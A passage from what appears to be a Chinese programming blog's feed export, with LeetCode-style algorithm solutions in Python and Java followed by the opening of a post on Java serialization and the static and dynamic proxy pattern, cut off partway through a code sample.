function">put</span><span class="token punctuation">(</span><span class="token string">"V"</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"X"</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"L"</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"C"</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"D"</span><span class="token punctuation">,</span> <span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"M"</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"IV"</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"IX"</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"XL"</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"XC"</span><span class="token punctuation">,</span> <span class="token number">90</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"CD"</span><span class="token punctuation">,</span> <span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"CM"</span><span class="token punctuation">,</span> <span class="token number">900</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Integer</span> tmp <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token class-name">Integer</span> n <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Integer</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;</span> n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token class-name">String</span> tmp1 <span class="token operator">=</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">String</span> tmp2 <span class="token operator">=</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">String</span> tmp3 <span class="token operator">=</span> tmp1 <span class="token operator">+</span> tmp2<span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>map<span class="token punctuation">.</span><span class="token function">containsKey</span><span class="token punctuation">(</span>tmp3<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                tmp <span class="token operator">=</span> tmp <span class="token operator">+</span> map<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>tmp3<span class="token punctuation">)</span><span class="token punctuation">;</span>                i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token class-name">String</span> a <span class="token operator">=</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                tmp <span class="token operator">=</span> tmp <span class="token operator">+</span> map<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>                i<span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;</span> n<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token class-name">String</span> a <span class="token operator">=</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            tmp <span class="token operator">=</span> tmp <span class="token operator">+</span> map<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> tmp <span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="最长公共前缀"><a href="#最长公共前缀" class="headerlink" title="最长公共前缀"></a>最长公共前缀</h3><h4 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h4><blockquote><p>编写一个函数来查找字符串数组中的最长公共前缀。</p><p>如果不存在公共前缀，返回空字符串 “”。</p><p> 示例 1：</p><p>输入：strs = [“flower”,”flow”,”flight”]<br>输出：”fl”<br>示例 2：</p><p>输入：strs = [“dog”,”racecar”,”car”]<br>输出：””<br>解释：输入不存在公共前缀。</p></blockquote><h4 id="解题-3"><a href="#解题-3" class="headerlink" title="解题"></a>解题</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">longestCommonPrefix</span><span class="token punctuation">(</span>s<span class="token punctuation">:</span> <span class="token builtin">list</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">str</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> s<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">""</span>    s<span class="token punctuation">.</span>sort<span class="token punctuation">(</span><span class="token punctuation">)</span>    n <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>    a <span class="token operator">=</span> s<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    b <span class="token operator">=</span> s<span class="token punctuation">[</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>    res <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> i <span class="token operator">&lt;</span> <span class="token builtin">len</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span> <span class="token keyword">and</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> b<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">:</span>            res <span class="token operator">+=</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>    <span class="token keyword">return</span> res<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">longestCommonPrefix</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> strs<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>strs <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> strs<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">;</span><span class="token punctuation">}</span>        <span class="token class-name">StringBuilder</span> res <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">sort</span><span class="token punctuation">(</span>strs<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> a <span class="token operator">=</span> strs<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">toCharArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> b <span class="token operator">=</span> strs<span class="token punctuation">[</span>strs<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">toCharArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> a<span class="token punctuation">.</span>length<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;</span> b<span class="token punctuation">.</span>length <span class="token operator">&amp;&amp;</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> b<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                res<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="浅写一下String、StringBuffer和StringBuilder的区别："><a href="#浅写一下String、StringBuffer和StringBuilder的区别：" class="headerlink" title="浅写一下String、StringBuffer和StringBuilder的区别："></a>浅写一下<strong>String、StringBuffer和StringBuilder的区别：</strong></h4><p><a href="https://so.csdn.net/so/search?q=String%E7%B1%BB&amp;spm=1001.2101.3001.7020">String类</a>是不可变类，即一旦一个String对象被创建以后，包含在这个对象中的字符序列是不可改变的，直至这个对象被销毁。</p><p>StringBuffer对象则代表一个字符序列可变的字符串，当一个StringBuffer被创建以后，通过StringBuffer提供的append()、insert()、reverse()、setCharAt()、setLength()等方法可以改变这个字符串对象的字符序列。一旦通过StringBuffer生成了最终想要的字符串，就可以调用它的toString()方法将其转换为一个String对象。</p><p>StringBuilder类也代表可变字符串对象。实际上，StringBuilder和StringBuffer基本相似，两个类的构造器和方法也基本相同。不同的是：<strong>StringBuffer是线程安全的，而StringBuilder则没有实现线程安全功能，所以性能略高。</strong></p><h3 id="有效括号"><a href="#有效括号" class="headerlink" title="有效括号"></a>有效括号</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> string<span class="token keyword">def</span> <span class="token function">isvalid</span><span class="token punctuation">(</span>test<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    dic <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">')'</span><span class="token punctuation">:</span><span class="token string">'('</span><span class="token punctuation">,</span><span class="token string">']'</span><span class="token punctuation">:</span><span class="token string">'['</span><span class="token punctuation">,</span><span class="token string">'}'</span><span class="token punctuation">:</span><span class="token string">'{'</span><span class="token punctuation">}</span>    stack <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> test<span class="token punctuation">:</span>        <span class="token keyword">if</span> stack <span class="token keyword">and</span> i <span class="token keyword">in</span> dic<span class="token punctuation">:</span>            <span class="token keyword">if</span> stack<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> dic<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">:</span> stack<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span> <span class="token keyword">return</span> <span class="token boolean">False</span>        <span class="token keyword">else</span><span class="token punctuation">:</span> stack<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token keyword">not</span> stack<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"{[]}"</span>    <span class="token comment">#isvalid(str)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>isvalid<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="合并两个有效链表"><a href="#合并两个有效链表" class="headerlink" title="合并两个有效链表"></a>合并两个有效链表</h3><h4 id="题目描述-4"><a href="#题目描述-4" class="headerlink" title="题目描述"></a>题目描述</h4><blockquote><p>将两个升序链表合并为一个新的 <strong>升序</strong> 链表并返回。新链表是通过拼接给定的两个链表的所有节点组成的</p></blockquote><h4 id="解题-4"><a href="#解题-4" class="headerlink" title="解题"></a>解题</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">mergeTwoLists</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> list1<span class="token punctuation">:</span> Optional<span class="token punctuation">[</span>ListNode<span class="token punctuation">]</span><span class="token punctuation">,</span> list2<span class="token punctuation">:</span> Optional<span class="token punctuation">[</span>ListNode<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> Optional<span class="token punctuation">[</span>ListNode<span class="token punctuation">]</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> list1<span class="token punctuation">:</span><span class="token keyword">return</span> list2        <span class="token keyword">if</span> <span class="token keyword">not</span> list2<span class="token punctuation">:</span><span class="token keyword">return</span> list1        <span class="token keyword">if</span> list1<span class="token punctuation">.</span>val <span class="token operator">&lt;=</span> list2<span class="token punctuation">.</span>val<span class="token punctuation">:</span>            list1<span class="token punctuation">.</span><span class="token builtin">next</span> <span class="token operator">=</span> self<span class="token punctuation">.</span>mergeTwoLists<span class="token punctuation">(</span>list1<span class="token punctuation">.</span><span class="token builtin">next</span><span class="token punctuation">,</span>list2<span class="token punctuation">)</span>            <span class="token keyword">return</span> list1        <span class="token keyword">else</span><span class="token punctuation">:</span>            list2<span class="token punctuation">.</span><span class="token builtin">next</span> <span class="token operator">=</span> self<span class="token punctuation">.</span>mergeTwoLists<span class="token punctuation">(</span>list1<span class="token punctuation">,</span> list2<span class="token punctuation">.</span><span class="token builtin">next</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> list2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="剑指：两个栈实现队列"><a href="#剑指：两个栈实现队列" class="headerlink" title="剑指：两个栈实现队列"></a>剑指：两个栈实现队列</h3><blockquote><p> 用两个栈实现一个队列。队列的声明如下，请实现它的两个函数 appendTail 和 deleteHead ，分别完成在队列尾部插入整数和在队列头部删除整数的功能。(若队列中没有元素，deleteHead 操作返回 -1 )</p></blockquote><p>函数设计：<br>题目只要求实现 加入队尾appendTail() 和 删除队首deleteHead() 两个函数的正常工作，因此我们可以设计栈 A 用于加入队尾操作，栈 B 用于将元素倒序，从而实现删除队首元素。</p><p>加入队尾 appendTail()函数： 将数字 val 加入栈 A 即可。<br>删除队首deleteHead()函数： 有以下三种情况。<br>当栈 B 不为空： B中仍有已完成倒序的元素，因此直接返回 B 的栈顶元素。<br>否则，当 A 为空： 即两个栈都为空，无元素，因此返回 -1−1 。<br>否则： 将栈 A 元素全部转移至栈 B 中，实现元素倒序，并返回栈 B 的栈顶元素。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">CQueue</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>A<span class="token punctuation">,</span> self<span class="token punctuation">.</span>B <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">def</span> <span class="token function">appendTail</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> value<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>A<span class="token punctuation">.</span>append<span class="token punctuation">(</span>value<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">deleteHead</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">int</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> self<span class="token punctuation">.</span>B<span class="token punctuation">:</span> <span class="token keyword">return</span> self<span class="token punctuation">.</span>B<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> self<span class="token punctuation">.</span>A<span class="token punctuation">:</span> <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span>        <span class="token keyword">while</span> self<span class="token punctuation">.</span>A<span class="token punctuation">:</span>            self<span class="token punctuation">.</span>B<span class="token punctuation">.</span>append<span class="token punctuation">(</span>self<span class="token punctuation">.</span>A<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>B<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h2><hr><h2 id="hard"><a href="#hard" class="headerlink" title="hard"></a>hard</h2>]]></content>
      
      
      <categories>
          
          <category> 开发学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习记录 </tag>
            
            <tag> 日记 </tag>
            
            <tag> 开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java_web学习之路(三)：CommonCollections 负无穷到烧0</title>
      <link href="/2022/03/15/commoncollections-easy/"/>
      <url>/2022/03/15/commoncollections-easy/</url>
      
        <content type="html"><![CDATA[<h1 id="java-web学习之路-三-：CommonCollections-负无穷到烧0"><a href="#java-web学习之路-三-：CommonCollections-负无穷到烧0" class="headerlink" title="java_web学习之路(三)：CommonCollections 负无穷到烧0"></a>java_web学习之路(三)：CommonCollections 负无穷到烧0</h1><h2 id="about-objectAnnotation"><a href="#about-objectAnnotation" class="headerlink" title="about objectAnnotation"></a>about objectAnnotation</h2><p>JDK1.5开始增加了Annotation功能，该功能可用于类，构造方法，成员变量，方法，参数等的声明中。该功能并不影响程序的运行，但是会对编译器警告等辅助工具产生影响。类似于可带进程序运行的注释</p><p>java在序列化一个对象时，会调用对象中的<strong>writeObject</strong>方法，传入的参数类型是<strong>ObjectOutputStream</strong>。对于开发者来说，此stream的内容可以自定义，由自己写入。在调用<strong>readObject</strong>进行反序列化时，也可以读取前面写入的内容。这就使Java开发变得灵活，比如HashMap的实现就是将所有键和值全部储存在<strong>objectAnnotation</strong>中。</p><h2 id="对象代理"><a href="#对象代理" class="headerlink" title="对象代理"></a>对象代理</h2><p>代理模式 是一种设计模式，提供了对目标对象额外的访问方式，即通过代理对象访问目标对象。这样可以不更改原目标对象的情况下，扩展目标对象功能，提供额外的操作。</p><h3 id="静态代理"><a href="#静态代理" class="headerlink" title="静态代理"></a>静态代理</h3><p>打个比方，电影是电影公司委托电影院放的，电影院就是代理。在放影片的前后电影院可以插播广告，达到赚钱的目的。</p><p>首先定义一个接口，通用的接口是代理模式实现的基础。这个接口我们命名为Movie，代表电影播放的能力</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>workit<span class="token punctuation">.</span>demo<span class="token punctuation">.</span>proxy</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">Movie</span> <span class="token punctuation">{</span>    <span class="token keyword">void</span> <span class="token function">play</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>加下来创建一个实现接口的类，也就是一个真正的电影</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>workit<span class="token punctuation">.</span>demo<span class="token punctuation">.</span>proxy</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">YourNmae</span> <span class="token keyword">implements</span> <span class="token class-name">Movie</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">play</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"普通影厅正在播放的电影是《你的名字》"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>代理类：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>workit<span class="token punctuation">.</span>demo<span class="token punctuation">.</span>proxy</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MovieStaticProxy</span> <span class="token keyword">implements</span> <span class="token class-name">Movie</span> <span class="token punctuation">{</span>    <span class="token class-name">Movie</span> movie<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">MovieStaticProxy</span><span class="token punctuation">(</span><span class="token class-name">Movie</span> movie<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>movie <span class="token operator">=</span> movie<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">play</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">playStart</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        movie<span class="token punctuation">.</span><span class="token function">play</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">playEnd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">playStart</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"电影开始前正在播放广告"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">playEnd</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"电影结束了，接续播放广告"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>测试类：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">StaticProxyTest</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">Movie</span> yourname <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">YourName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Movie</span> movieStaticProxy <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MovieStaticProxy</span><span class="token punctuation">(</span>yourname<span class="token punctuation">)</span><span class="token punctuation">;</span>        movieStaticProxy<span class="token punctuation">.</span><span class="token function">play</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结果：</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">电影开始前正在播放广告正在播放的电影是《你的名字》电影结束了，接续播放广告<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>现在可以看到，<strong>代理模式可以在不修改被代理对象的基础上，通过扩展代理类，进行一些功能的附加与增强。值得注意的是，代理类和被代理类应该共同实现一个接口，或者是共同继承某个类</strong>。这个就是是静态代理的内容，为什么叫做静态呢？因为它的类型是事先预定好的，比如上面代码中的 <code>MovieStaticProxy</code> 这个类。</p><h3 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h3><p>动态代理类的字节码在程序运行时由 Java 反射机制动态生成，无需程序员手工编写它的源代码。动态代理类不仅简化了编程工作，而且提高了软件系统的可扩展性，因为 Java 反射机制可以生成任意类型的动态代理类。<code>java.lang.reflect</code> 包中的 Proxy 类和<code>InvocationHandler</code> 接口提供了生成动态代理类的能力。 </p><p>动态代理就是发生在程序运行时，动态生成代理类的字节码，并加载进来。</p><p>实现动态代理位于java.lang.reflect包下</p><p>编写代理类：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>proxy</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">InvocationHandler</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token 